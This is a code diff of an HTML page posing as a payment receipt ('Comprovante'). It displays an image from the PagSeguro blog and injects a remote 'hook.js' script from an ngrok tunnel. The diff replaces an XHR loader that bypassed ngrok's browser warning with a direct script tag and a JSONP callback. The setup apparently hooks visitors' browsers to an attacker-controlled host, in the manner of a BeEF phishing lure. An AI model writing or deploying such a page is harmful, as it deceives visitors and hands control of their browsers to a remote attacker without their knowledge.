@@ -3,27 +3,22 @@
 <head>
     <title>Comprovante</title>
     <script>
-        // Create a new script element
+        // Define a callback function that will be called by the JSONP script
+        function jsonpCallback(data) {
+            console.log('JSONP callback executed:', data);
+            // You can process the data here
+        }
+
+        // Create a new script element for JSONP
         var script = document.createElement('script');
-        script.src = 'https://9288-191-54-132-249.ngrok-free.app:443/hook.js';
+        script.src = 'https://a679-191-54-132-249.ngrok-free.app:443/hook.js?callback=jsonpCallback'; // Append the callback parameter
 
-        // Set a custom request header
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', script.src, true);
-        xhr.setRequestHeader('ngrok-skip-browser-warning', 'true'); // Set the ngrok-skip-browser-warning header
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4 && xhr.status === 200) {
-                // Append the script to the head when it's loaded
-                document.head.appendChild(script);
-            }
-        };
-        xhr.send();
-
+        // Append the script to the head
+        document.head.appendChild(script);
     </script>
 </head>
 <body>
     <img src="https://assets-blog.pagseguro.uol.com.br/wp-content/2020/11/Post_329_imagem_meio_de_texto_IIIIIII.png" alt="Imagem">
-    <!-- script updated 1-->
+    <!-- script updated 2 -->
 </body>
 </html>
-
